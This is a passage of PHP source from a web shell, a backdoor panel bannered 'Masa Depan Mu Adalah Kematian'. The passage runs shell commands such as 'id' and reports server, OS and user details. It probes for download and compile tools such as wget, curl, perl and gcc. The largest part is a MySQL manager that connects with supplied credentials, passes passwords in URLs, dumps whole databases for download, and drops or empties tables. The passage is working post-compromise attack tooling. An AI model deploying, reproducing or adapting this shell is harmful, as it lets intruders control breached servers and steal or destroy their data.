echo "<div class=barheader2><h3>$sh_name</h3><font color=lime>:: Masa Depan Mu Adalah Kematian ::</font></div><hr color=black>\n";
echo "<table id=pagebar><tr><td width=50%><p>".
     "Software : ".$DISP_SERVER_SOFTWARE ." - <a href=".$surl."x=phpini>php.ini</a><br>".
     "$hsafemode<br>".
     "OS : ".php_uname()."<br>";
if (!$win) { echo "User ID : ".myshellexec("id"); }
else { echo "User : " . get_current_user(); }
echo "</p></td>".
     "<td width=50%><p>Server IP : <a href=http://www.ip-adress.com/".gethostbyname($_SERVER["HTTP_HOST"]).">".gethostbyname($_SERVER["HTTP_HOST"])."</a> - ".
     "Your IP : <a href=http://www.ip-adress.com/".$_SERVER["REMOTE_ADDR"].">".$_SERVER["REMOTE_ADDR"]."</a><br>";
if($win){echo "Drives : ".disp_drives($d,$surl)."<br>";}
echo "Freespace : ".disp_freespace($d);
echo "</p></td></tr>";
echo "<tr><td colspan=2><p>";
echo "MySQL: ".testmysql()." cURL: ".testcurl()." WGet: ".testwget()." Fetch: ".testfetch()." Perl: ".testperl()." gcc: ".testgcc()." SH: ".testSH()."<br>";
echo "Disabled Functions: ".showdisablefunctions();
echo "</p></td></tr>";
echo "<tr><td colspan=2 id=mainmenu>";
if (count($quicklaunch2) > 0) {
  foreach($quicklaunch2 as $item) {
    $item[1] = str_replace("%d",urlencode($d),$item[1]);
    $item[1] = str_replace("%sort",$sort,$item[1]);
    $v = realpath($d."..");
    if (empty($v)) {
      $a = explode(DIRECTORY_SEPARATOR,$d);
      unset($a[count($a)-2]);
      $v = join(DIRECTORY_SEPARATOR,$a);
    }
    $item[1] = str_replace("%upd",urlencode($v),$item[1]);
    echo "<a href=\"".$item[1]."\">".$item[0]."</a>\n";
  }
}
echo "</td><tr><td colspan=2 id=mainmenu>";
if (count($quicklaunch1) > 0) {
  foreach($quicklaunch1 as $item) {
    $item[1] = str_replace("%d",urlencode($d),$item[1]);
    $item[1] = str_replace("%sort",$sort,$item[1]);
    $v = realpath($d."..");
    if (empty($v)) {
      $a = explode(DIRECTORY_SEPARATOR,$d);
      unset($a[count($a)-2]);
      $v = join(DIRECTORY_SEPARATOR,$a);
    }
    $item[1] = str_replace("%upd",urlencode($v),$item[1]);
    echo "<a href=\"".$item[1]."\">".$item[0]."</a>\n";
  }
}
echo "</td></tr><tr><td colspan=2>";
echo "<p class=fleft>";
$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));
$i = 0;
foreach($pd as $b) {
  $t = ""; $j = 0;
  foreach ($e as $r) {
    $t.= $r.DIRECTORY_SEPARATOR;
    if ($j == $i) { break; }
    $j++;
  }
  echo "<a href=\"".$surl."x=ls&d=".urlencode($t)."&sort=".$sort."\"><font color=white>".htmlspecialchars($b).DIRECTORY_SEPARATOR."</font></a>";
  $i++;
}
echo " - ";
if (is_writable($d)) {
  $wd = TRUE;
  $wdt = "<font color=#00FF00>[OK]</font>";
  echo "<b><font color=green>".view_perms(fileperms($d))."</font>";
}
else {
  $wd = FALSE;
  $wdt = "<font color=red>[Read-Only]</font>";
  echo "<b>".view_perms_color($d)."</b>";
}
?>
</p>
<div class=fright>
<form method="POST"><input type=hidden name=act value="ls">
Directory: <input type="text" name="d" size="50" value="<?php echo $dispd; ?>"> <input type=submit value="Go">
</form>
</div>
</td></tr></table>
<?php
echo "<table id=maininfo><tr><td width=\"100%\">\n";
if ($x == "") { $x = $dspact = "ls"; }
if ($x == "phpini" ) { get_phpini(); }
if ($x == "sql") {
  $sql_surl = $surl."x=sql";
  if ($sql_login)  {$sql_surl .= "&sql_login=".htmlspecialchars($sql_login);}
  if ($sql_passwd) {$sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd);}
  if ($sql_server) {$sql_surl .= "&sql_server=".htmlspecialchars($sql_server);}
  if ($sql_port)   {$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);}
  if ($sql_db)     {$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);}
  $sql_surl .= "&";
  echo "<table>".
       "<tr><td width=\"100%\" colspan=2 class=barheader>";
  if ($sql_server) {
    $sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
    $err = mysql_smarterror();
    @mysql_select_db($sql_db,$sql_sock);
    if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}
  }
  else {$sql_sock = FALSE;}
  echo ".: SQL Manager :.<br>";
  if (!$sql_sock) {
    if (!$sql_server) {echo "NO CONNECTION";}
    else {echo "Can't connect! ".$err;}
  }
  else {
    $sqlquicklaunch = array();
    $sqlquicklaunch[] = array("Index",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");
    $sqlquicklaunch[] = array("Query",$sql_surl."sql_x=query&sql_tbl=".urlencode($sql_tbl));
    $sqlquicklaunch[] = array("Server-status",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_x=serverstatus");
    $sqlquicklaunch[] = array("Server variables",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_x=servervars");
    $sqlquicklaunch[] = array("Processes",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_x=processes");
    $sqlquicklaunch[] = array("Logout",$surl."x=sql");
    echo "MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")<br>";
    if (count($sqlquicklaunch) > 0) {foreach($sqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";}}
  }
  echo "</td></tr><tr>";
  if (!$sql_sock) {
    echo "<td width=\"28%\" height=\"100\" valign=\"top\"><li>If login is null, login is owner of process.<li>If host is null, host is localhost</b><li>If port is null, port is 3306 (default)</td><td width=\"90%\" height=1 valign=\"top\">";
    echo "<table width=\"100%\" border=0><tr><td><b>Please, fill the form:</b><table><tr><td><b>Username</b></td><td><b>Password</b></td><td><b>Database</b></td></tr><form action=\" $surl \" method=\"POST\"><input type=\"hidden\" name=\"x\" value=\"sql\"><tr><td><input type=\"text\" name=\"sql_login\" value=\"root\" maxlength=\"64\"></td><td><input type=\"password\" name=\"sql_passwd\" value=\"\" maxlength=\"64\"></td><td><input type=\"text\" name=\"sql_db\" value=\"\" maxlength=\"64\"></td></tr><tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right><input type=\"text\" name=\"sql_server\" value=\"localhost\" maxlength=\"64\"></td><td><input type=\"text\" name=\"sql_port\" value=\"3306\" maxlength=\"6\" size=\"3\"></td><td><input type=\"submit\" value=\"Connect\"></td></tr><tr><td></td></tr></form></table></td>";
  }
  else {
    if (!empty($sql_db)) {
      ?><td width="25%" height="100%" valign="top"><a href="<?php echo $surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?>"><b>Home</b></a><hr size="1" noshade>
      <?php
      $result = mysql_list_tables($sql_db);
      if (!$result) {echo mysql_smarterror();}
      else {
        echo "---[ <a href=\"".$sql_surl."&\"><b>".htmlspecialchars($sql_db)."</b></a> ]---<br>";
        $c = 0;
        while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "<b>+&nbsp;<a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>"; mysql_free_result($count); $c++;}
        if (!$c) {echo "No tables found in database.";}
      }
    }
    else {
      ?><td width="1" height="100" valign="top"><a href="<?php echo $sql_surl; ?>"><b>Home</b></a><hr size="1" noshade>
      <?php
      $result = mysql_list_dbs($sql_sock);
      if (!$result) {echo mysql_smarterror();}
      else {
        ?><form action="<?php echo $surl; ?>"><input type="hidden" name="x" value="sql"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><select name="sql_db">
        <?php
        $c = 0;
        $dbs = "";
        while ($row = mysql_fetch_row($result)) {$dbs .= "<option value=\"".$row[0]."\""; if ($sql_db == $row[0]) {$dbs .= " selected";} $dbs .= ">".$row[0]."</option>"; $c++;}
        echo "<option value=\"\">Databases (".$c.")</option>";
        echo $dbs;
      }
      ?></select><hr size="1" noshade>Please, select database<hr size="1" noshade><input type="submit" value="Go"></form>
      <?php
    }
    echo "</td><td width=\"100%\">";
    $diplay = TRUE;
    if ($sql_db) {
      if (!is_numeric($c)) {$c = 0;}
      if ($c == 0) {$c = "no";}
      echo "<hr size=\"1\" noshade><center><b>There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").<br>";
      if (count($dbquicklaunch) > 0) {foreach($dbsqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";}}
      echo "</b></center>";
      $acts = array("","dump");
      if ($sql_x == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
      elseif ($sql_x == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_x = "query";}
      elseif ($sql_x == "tbldump") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_x = "dump";}
      elseif ($sql_x == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
      elseif ($sql_x == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
      elseif ($sql_x == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
      elseif ($sql_x == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
      elseif ($sql_x == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";} $sql_query = substr($sql_query,0,-1);} $sql_x = "query";}
      elseif ($sql_tbl_x == "insert") {
        if ($sql_tbl_insert_radio == 1) {
          $keys = "";
          $akeys = array_keys($sql_tbl_insert);
          foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";}
          if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}
          $values = "";
          $i = 0;
          foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} $values .= "'".addslashes($v)."'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;}
          if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}
          $sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";
          $sql_x = "query";
          $sql_tbl_x = "browse";
        }
        elseif ($sql_tbl_insert_radio == 2) {
          $set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);
          $sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";
          $result = mysql_query($sql_query) or print(mysql_smarterror());
          $result = mysql_fetch_array($result, MYSQL_ASSOC);
          $sql_x = "query";
          $sql_tbl_x = "browse";
        }
      }
      if ($sql_x == "query") {
        echo "<hr size=\"1\" noshade>";
        if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
        if ($sql_query_result or (!$sql_confirm)) {$sql_x = $sql_goto;}
        if ((!$submit) or ($sql_x)) {echo "<table border=\"0\" width=\"100%\" height=\"1\"><tr><td><form action=\"".$sql_surl."\" method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\"hidden\" name=\"sql_x\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\"> <input type=\"submit\" value=\"No\"></form></td></tr></table>";}
      }
      if (in_array($sql_x,$acts)) {
        ?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new table:</b>
        <form action="<?php echo $surl; ?>">
        <input type="hidden" name="x" value="sql">
        <input type="hidden" name="sql_x" value="newtbl">
        <input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>">
        <input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>">
        <input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>">
        <input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>">
        <input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>">
        <input type="text" name="sql_newtbl" size="20">
        <input type="submit" value="Create">
        </form></td>
        <td width="30%" height="1"><b>Dump DB:</b>
        <form action="<?php echo $surl; ?>">
        <input type="hidden" name="x" value="sql">
        <input type="hidden" name="sql_x" value="dump">
        <input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>">
        <input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>">
        <input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>">
        <input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="dump_file" size="30" value="<?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>"><input type="submit" name=\"submit\" value="Dump"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table>
        <?php
        if (!empty($sql_x)) {echo "<hr size=\"1\" noshade>";}
        if ($sql_x == "newtbl") {
          echo "<b>";
          if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {
            echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";
          }
          else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
        }
        elseif ($sql_x == "dump") {
          if (empty($submit)) {
            $diplay = FALSE;
            echo "<form method=\"GET\"><input type=\"hidden\" name=\"x\" value=\"sql\"><input type=\"hidden\" name=\"sql_x\" value=\"dump\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><b>SQL-Dump:</b><br><br>";
            echo "<b>DB:</b> <input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\"><br><br>";
            $v = join (";",$dmptbls);
            echo "<b>Only tables (explode \";\")&nbsp;<b><sup>1</sup></b>:</b>&nbsp;<input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\"><br><br>";
            if ($dump_file) {$tmp = $dump_file;}
            else {$tmp = htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");}
            echo "<b>File:</b>&nbsp;<input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp) % 30)."\"><br><br>";
            echo "<b>Download: </b>&nbsp;<input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked><br><br>";
            echo "<b>Save to file: </b>&nbsp;<input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked>";
            echo "<br><br><input type=\"submit\" name=\"submit\" value=\"Dump\"><br><br><b><sup>1</sup></b> - all, if empty";
            echo "</form>";
          }
          else {
            $diplay = TRUE;
            $set = array();
            $set["sock"] = $sql_sock;
            $set["db"] = $sql_db;
            $dump_out = "download";
            $set["print"] = 0;
            $set["nl2br"] = 0;
            $set[""] = 0;
            $set["file"] = $dump_file;
            $set["add_drop"] = TRUE;
            $set["onlytabs"] = array();
            if (!empty($dmptbls)) {$set["onlytabs"] = explode(";",$dmptbls);}
            $ret = mysql_dump($set);
            if ($sql_dump_download) {
              @ob_clean();
              header("Content-type: application/octet-stream");
              header("Content-length: ".strlen($ret));
              header("Content-disposition: attachment; filename=\"".basename($sql_dump_file)."\";");
              echo $ret;
              exit;
            }
            elseif ($sql_dump_savetofile) {
              $fp = fopen($sql_dump_file,"w");
              if (!$fp) {echo "<b>Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";}
              else {
                fwrite($fp,$ret);
                fclose($fp);
                echo "<b>Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")</b>.";
              }
            }
            else {echo "<b>Dump: nothing to do!</b>";}
          }
        }
        if ($diplay) {
    if (!empty($sql_tbl)) {
      if (empty($sql_tbl_x)) {$sql_tbl_x = "browse";}
      $count = mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;");
      $count_row = mysql_fetch_array($count);
      mysql_free_result($count);
      $tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");
      $tbl_struct_fields = array();
      while ($row = mysql_fetch_assoc($tbl_struct_result)) {$tbl_struct_fields[] = $row;}
      if ($sql_ls > $sql_le) {$sql_le = $sql_ls + $perpage;}
      if (empty($sql_tbl_page)) {$sql_tbl_page = 0;}
      if (empty($sql_tbl_ls)) {$sql_tbl_ls = 0;}
      if (empty($sql_tbl_le)) {$sql_tbl_le = 30;}
      $perpage = $sql_tbl_le - $sql_tbl_ls;
      if (!is_numeric($perpage)) {$perpage = 10;}
      $numpages = $count_row[0]/$perpage;
      $e = explode(" ",$sql_order);
      if (count($e) == 2) {
        if ($e[0] == "d") {$asc_desc = "DESC";}
        else {$asc_desc = "ASC";}
        $v = "ORDER BY `".$e[1]."` ".$asc_desc." ";
      }
      else {$v = "";}
      $query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";
      $result = mysql_query($query) or print(mysql_smarterror());
      echo "<hr size=\"1\" noshade><center><b>Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)</b></center>";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_x=structure\">[<b> Structure </b>]</a>&nbsp;&nbsp;&nbsp;";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_x=browse\">[<b> Browse </b>]</a>&nbsp;&nbsp;&nbsp;";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_x=tbldump&thistbl=1\">[<b> Dump </b>]</a>&nbsp;&nbsp;&nbsp;";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_x=insert\">[&nbsp;<b>Insert</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
      if ($sql_tbl_x == "structure") {echo "<br><br><b>Coming sooon!</b>";}
      if ($sql_tbl_x == "insert") {
        if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();}
        if (!empty($sql_tbl_insert_radio)) {  } //Not Ready
        else {
          echo "<br><br><b>Inserting row into table:</b><br>";
          if (!empty($sql_tbl_insert_q)) {
            $sql_query = "SELECT * FROM `".$sql_tbl."`";
            $sql_query .= " WHERE".$sql_tbl_insert_q;
            $sql_query .= " LIMIT 1;";
            $result = mysql_query($sql_query,$sql_sock) or print("<br><br>".mysql_smarterror());
            $values = mysql_fetch_assoc($result);
            mysql_free_result($result);
          }
          else {$values = array();}
          echo "<form method=\"POST\"><table width=\"1%\" border=1><tr><td><b>Field</b></td><td><b>Type</b></td><td><b>Function</b></td><td><b>Value</b></td></tr>";
          foreach ($tbl_struct_fields as $field) {
            $name = $field["Field"];
            if (empty($sql_tbl_insert_q)) {$v = "";}
            echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Type"]."</td><td><select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"><option value=\"\"></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value=\"\">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50></td></tr>";
            $i++;
          }
          echo "</table><br>";
          echo "<input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "><b>Insert as new row</b>";
          if (!empty($sql_tbl_insert_q)) {echo " or <input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked><b>Save</b>"; echo "<input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\">";}
          echo "<br><br><input type=\"submit\" value=\"Confirm\"></form>";
        }
      }
      if ($sql_tbl_x == "browse") {
        $sql_tbl_ls = abs($sql_tbl_ls);
        $sql_tbl_le = abs($sql_tbl_le);
        echo "<hr size=\"1\" noshade>";
        echo "<img src=\"".$surl."x=img&img=multipage\" height=\"12\" width=\"10\" alt=\"Pages\">&nbsp;";
        $b = 0;
        for($i=0;$i<$numpages;$i++) {
          if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."\"><u>";}
          echo $i;
          if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "</u></a>";}
          if (($i/30 == round($i/30)) and ($i > 0)) {echo "<br>";}
          else {echo "&nbsp;";}
        }
        if ($i == 0) {echo "empty";}
        echo "<form method=\"GET\"><input type=\"hidden\" name=\"x\" value=\"sql\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\"><b>From:</b>&nbsp;<input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\">&nbsp;<input type=\"submit\" value=\"View\"></form>";
        echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1>";
        echo "<tr>";
        echo "<td><input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"></td>";
        for ($i=0;$i<mysql_num_fields($result);$i++) {
          $v = mysql_field_name($result,$i);
          if ($e[0] == "a") {$s = "d"; $m = "asc";}
          else {$s = "a"; $m = "desc";}
          echo "<td>";
          if (empty($e[0])) {$e[0] = "a";}
          if ($e[1] != $v) {echo "<a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."\"><b>".$v."</b></a>";}
          else {echo "<b>".$v."</b><a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\"><img src=\"".$surl."x=img&img=sort_".$m."\" height=\"9\" width=\"14\" alt=\"".$m."\"></a>";}
          echo "</td>";
        }
      echo "<td><font color=\"green\"><b>Action</b></font></td>";
      echo "</tr>";
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
       echo "<tr>";
       $w = "";
       $i = 0;
       foreach ($row as $k=>$v) {$name = mysql_field_name($result,$i); $w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;}
       if (count($row) > 0) {$w = substr($w,0,strlen($w)-3);}
       echo "<td><input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\"></td>";
       $i = 0;
       foreach ($row as $k=>$v)
       {
        $v = htmlspecialchars($v);
        if ($v == "") {$v = "<font color=\"green\">NULL</font>";}
        echo "<td>".$v."</td>";
        $i++;
       }
       echo "<td>";
       echo "<a href=\"".$sql_surl."sql_x=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\"><img src=\"".$surl."x=img&img=sql_button_drop\" alt=\"Delete\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;";
       echo "<a href=\"".$sql_surl."sql_tbl_x=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\"><img src=\"".$surl."x=img&img=change\" alt=\"Edit\" height=\"14\" width=\"14\" border=\"0\"></a>&nbsp;";
       echo "</td>";
       echo "</tr>";
      }
      mysql_free_result($result);
      echo "</table><hr size=\"1\" noshade><p align=\"left\"><img src=\"".$surl."x=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_x\">";
      echo "<option value=\"\">With selected:</option>";
      echo "<option value=\"deleterow\">Delete</option>";
      echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form></p>";
     }
    }
    else {
     $result = mysql_query("SHOW TABLE STATUS", $sql_sock);
     if (!$result) {echo mysql_smarterror();}
     else
     {
      echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td><input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"></td><td><center><b>Table</b></center></td><td><b>Rows</b></td><td><b>Type</b></td><td><b>Created</b></td><td><b>Modified</b></td><td><b>Size</b></td><td><b>Action</b></td></tr>";
      $i = 0;
      $tsize = $trows = 0;
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
      {
       $tsize += $row["Data_length"];
       $trows += $row["Rows"];
       $size = view_size($row["Data_length"]);
       echo "<tr>";
       echo "<td><input type=\"checkbox\" name=\"boxtbl[]\" value=\"".$row["Name"]."\"></td>";
       echo "<td>&nbsp;<a href=\"".$sql_surl."sql_tbl=".urlencode($row["Name"])."\"><b>".$row["Name"]."</b></a>&nbsp;</td>";
       echo "<td>".$row["Rows"]."</td>";
       echo "<td>".$row["Type"]."</td>";
       echo "<td>".$row["Create_time"]."</td>";
       echo "<td>".$row["Update_time"]."</td>";
       echo "<td>".$size."</td>";
